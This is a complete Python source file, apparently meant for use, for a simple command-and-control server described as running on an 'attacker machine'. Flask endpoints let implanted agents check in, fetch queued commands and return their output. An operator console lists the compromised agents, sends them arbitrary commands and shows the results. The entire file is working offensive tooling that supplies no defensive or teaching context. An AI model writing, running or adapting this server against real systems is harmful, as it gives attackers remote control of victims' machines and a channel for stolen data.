# language: Python 3, file: c2_server.py, target: Windows/Linux (attacker machine)
# Simple HTTP C2 server. Agents beacon in via GET, receive commands, POST results back.
# pip install flask
from flask import Flask, request, jsonify
import threading
import uuid
import datetime
import json
import os

app = Flask(__name__)
lock = threading.Lock()

# agents[agent_id] = {last_seen, ip, pending_cmd, results}
agents = {}

@app.route('/beacon', methods=['GET'])
def beacon():
    aid = request.args.get('id', '')
    if not aid:
        return 'bad', 400
    ip = request.remote_addr
    ts = datetime.datetime.utcnow().isoformat()
    with lock:
        if aid not in agents:
            print(f'[+] New agent: {aid} from {ip}')
            agents[aid] = {'last_seen': ts, 'ip': ip, 'pending_cmd': '', 'results': []}
        else:
            agents[aid]['last_seen'] = ts
            agents[aid]['ip'] = ip
        cmd = agents[aid].get('pending_cmd', '')
        agents[aid]['pending_cmd'] = ''
    return jsonify({'cmd': cmd})

@app.route('/result', methods=['POST'])
def result():
    data = request.get_json(force=True)
    aid = data.get('id', '')
    out = data.get('output', '')
    ts = datetime.datetime.utcnow().isoformat()
    with lock:
        if aid in agents:
            agents[aid]['results'].append({'ts': ts, 'output': out})
    print(f'\n[RESULT from {aid}]\n{out}\n')
    return 'ok'

def console():
    import time
    time.sleep(1)
    print('[*] C2 Console ready. Commands: list | cmd <id> <command> | results <id> | exit')
    while True:
        try:
            line = input('C2> ').strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            continue
        parts = line.split(' ', 2)
        if parts[0] == 'list':
            with lock:
                for aid, info in agents.items():
                    print(f'  [{aid}] {info["ip"]} last={info["last_seen"]}')
        elif parts[0] == 'cmd' and len(parts) == 3:
            aid, cmd = parts[1], parts[2]
            with lock:
                if aid in agents:
                    agents[aid]['pending_cmd'] = cmd
                    print(f'[*] Command queued for {aid}')
                else:
                    print(f'[!] Agent {aid} not found')
        elif parts[0] == 'results' and len(parts) == 2:
            aid = parts[1]
            with lock:
                if aid in agents:
                    for r in agents[aid]['results']:
                        print(f"  [{r['ts']}] {r['output']}")
                else:
                    print('[!] Agent not found')
        elif parts[0] == 'exit':
            os._exit(0)

def main():
    port = int(input('C2 listen port (ex: 4443): ').strip())
    print(f'[*] C2 server starting on 0.0.0.0:{port}')
    t = threading.Thread(target=console, daemon=True)
    t.start()
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    main()
